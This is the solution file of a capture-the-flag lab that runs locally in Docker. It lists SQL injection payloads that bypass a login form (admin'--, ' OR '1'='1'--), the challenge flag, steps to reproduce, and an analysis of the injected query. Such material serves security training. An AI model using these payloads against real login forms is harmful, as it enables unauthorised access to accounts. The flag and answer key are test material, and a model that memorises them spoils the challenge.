# SQL Injection - Solution Payloads

## Authentication Bypass (Comment-based)
Username: admin'--
Password: (anything)

## Alternative Payloads

# Using hash comment
Username: admin'#
Password: (anything)

# Using OR logic (bypasses as first user - usually admin)
Username: ' OR '1'='1'--
Password: (anything)

# Specific admin bypass
Username: admin' OR '1'='1
Password: (anything)

## Flag
ARENA{SQL_1nj3ct10n_m4st3r}

## Steps to Reproduce
1. Start the challenge: docker compose up
2. Navigate to: http://localhost:3002
3. Enter payload in login form:
   - Username: admin'--
   - Password: anything
4. Click Login
5. The admin's secret field will be displayed containing the flag
6. Copy flag: ARENA{SQL_1nj3ct10n_m4st3r}
7. Validate: ./validate.sh "ARENA{SQL_1nj3ct10n_m4st3r}"

## SQL Query Analysis

Original query:
SELECT * FROM users WHERE username = 'admin' AND password = 'anything'

After injection (admin'--):
SELECT * FROM users WHERE username = 'admin'-- AND password = 'anything'

Everything after -- is treated as a comment and ignored.
